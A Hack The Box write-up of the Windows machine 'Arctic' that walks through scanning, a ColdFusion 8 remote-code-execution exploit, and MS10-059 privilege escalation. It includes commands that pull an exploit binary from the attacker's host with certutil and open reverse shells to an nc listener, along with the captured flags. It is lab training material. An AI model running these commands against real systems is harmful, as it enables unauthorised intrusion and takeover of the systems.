---
date: 2024-10-10
title: Arctic HTB Write-Up
machine_ip: 10.10.10.11
os: Windows
difficulty: Easy
my_rating: 4
tags:
  - Windows
  - PrivEsc
  - Chimichurri
  - MS10-059
  - windows-exploit-suggester
  - mftp
  - Coldfusion
  - nc
  - certutil
  - rustscan
references: "[[📚CTF Box Writeups]]"
---

# Enumeration

- Rustscan #rustscan
```
┌──(root㉿swabby)-[~/Downloads]
└─# rustscan -a 10.10.10.11 -t 500 -b 1500 -- -sVC
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.11:135
Open 10.10.10.11:8500
Open 10.10.10.11:49154
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 14:23 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:23
Completed NSE at 14:23, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:23
Completed NSE at 14:23, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:23
Completed NSE at 14:23, 0.00s elapsed
Initiating Ping Scan at 14:23
Scanning 10.10.10.11 [4 ports]
Completed Ping Scan at 14:23, 0.61s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:23
Completed Parallel DNS resolution of 1 host. at 14:23, 0.41s elapsed
DNS resolution of 1 IPs took 0.41s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 14:23
Scanning 10.10.10.11 [3 ports]
Discovered open port 135/tcp on 10.10.10.11
Discovered open port 49154/tcp on 10.10.10.11
Discovered open port 8500/tcp on 10.10.10.11
Completed SYN Stealth Scan at 14:23, 0.20s elapsed (3 total ports)
Initiating Service scan at 14:23
Scanning 3 services on 10.10.10.11
Completed Service scan at 14:26, 161.56s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.11.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:26
Completed NSE at 14:26, 11.50s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:26
Completed NSE at 14:26, 5.40s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:26
Completed NSE at 14:26, 0.00s elapsed
Nmap scan report for 10.10.10.11
Host is up, received echo-reply ttl 127 (0.46s latency).
Scanned at 2024-10-10 14:23:48 EDT for 179s

PORT      STATE SERVICE REASON          VERSION
135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
8500/tcp  open  fmtp?   syn-ack ttl 127
49154/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:26
Completed NSE at 14:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:26
Completed NSE at 14:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:26
Completed NSE at 14:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 179.91 seconds
           Raw packets sent: 7 (284B) | Rcvd: 7 (324B)
```


- The Managed File Transfer Protocol #mftp on port 8500 that is open at `http://10.10.10.11:8500/` shows directories we can browse.
	- We also found during enumeration `http://10.10.10.11:8500/CFIDE/administrator/` which leads us to a Web Portal for Adobe Cold Fusion 8 Administrator
	- Upon research, we find that:
		- "ColdFusion scripts are commonly run as an elevated user, such as NT-Authority\SYSTEM (Windows) or root (Linux), making them especially susceptible to web-based attacks."

# Foothold
- gain shell via exploit
- Using `searchsploit`, we find an exploit for Adobe ColdFusion 8 - Remote Command Execution (RCE), `cfm/webapps/50057.py` #Coldfusion 
```
┌──(root㉿swabby)-[~/Downloads]
└─# searchsploit Adobe ColdFusion 8
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
...
Adobe ColdFusion 8 - Remote Command Execution (RCE)                               | cfm/webapps/50057.py
...
```

- Running this exploit and specifying the lhost, lport, rhost, and rport, we can get a shell
```
┌──(root㉿swabby)-[~/Downloads]
└─# python3 ./50057.py

Generating a payload...
Payload size: 1497 bytes
Saved as: 63f11d8a07d1477dad1838d737b6aad1.jsp

Priting request...
Content-type: multipart/form-data; boundary=fae0014bf9974fbe87c057c88e20fa06
Content-length: 1698

--fae0014bf9974fbe87c057c88e20fa06
Content-Disposition: form-data; name="newfile"; filename="63f11d8a07d1477dad1838d737b6aad1.txt"
Content-Type: text/plain

Printing some information for debugging...
lhost: 10.10.14.31
lport: 4444
rhost: 10.10.10.11
rport: 8500
payload: 63f11d8a07d1477dad1838d737b6aad1.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 4444 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.11] 49852



Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

- Now that we have user, we can grab user flag and work on escalating
```
C:\Users\tolis\Desktop>type user.txt
type user.txt
6cd6312904873a6491b4e01b8c7c36f8
```
# PrivEsc
- escalate from webshell/user to root
- We see we have `SeImpersonatePrivilege`
```
C:\Users\tolis\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```

- Maybe we can try a Potato attack, lets transfer `JuicyPotato.exe` and run it. This was unsuccessful

- Taking a step back I remember to K.I.S.S. So I run `windows-exploit-suggester.py`
```
┌──(root㉿kali)-[~/Downloads]
└─# ./windows-exploit-suggester.py --database 2024-10-10-mssb.xls --systeminfo Arctic_sysinfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```
- Check this repo for [Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits/tree/master)
- After trying checking exploits from bottom to top, we land on MS10-059, download it
- Transfer the payload to the RHOST
```
C:\Users\tolis\Desktop>certutil -urlcache -f http://10.10.14.2:8000/Chimichurri.exe ms.exe
certutil -urlcache -f http://10.10.14.2:8000/Chimichurri.exe ms.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

- Now, run the exploit from RHOST, specifying the LHOST ip and port. 
	- Similarly on LHOST, start `nc` listener for same port
```
C:\Users\tolis\Desktop>ms.exe 10.10.14.2 5555                                                                                                      
ms.exe 10.10.14.2 5555                                                                                                                        
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>       
```

- We caught a shell as `NT AUTHORITY/SYSTEM`
```
┌──(root㉿kali)-[~/Downloads]
└─# nc -lnvp 5555 
listening on [any] 5555 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.11] 49583
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\tolis\Desktop>whoami 
whoami 
nt authority\system
```

- Root flag
```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
6faf750c9fca73b7af3441e77749b1c3
```